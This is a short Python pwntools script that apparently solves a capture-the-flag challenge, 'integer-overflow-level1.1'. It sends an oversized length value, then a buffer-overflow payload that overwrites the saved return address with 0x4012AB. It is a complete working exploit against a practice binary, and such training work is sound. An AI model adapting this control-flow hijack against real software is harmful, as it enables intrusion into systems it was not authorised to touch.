#!/usr/bin/python

from pwn import *

context.log_level = "debug"
proc = process("/challenge/integer-overflow-level1.1")

payload = b"0x140"
proc.sendline(payload)

payload = cyclic(0x100) # buf
payload += cyclic(8)    # saved_rbp
payload += p64(0x4012AB)    # saved_ret

proc.send(payload)
proc.interactive()
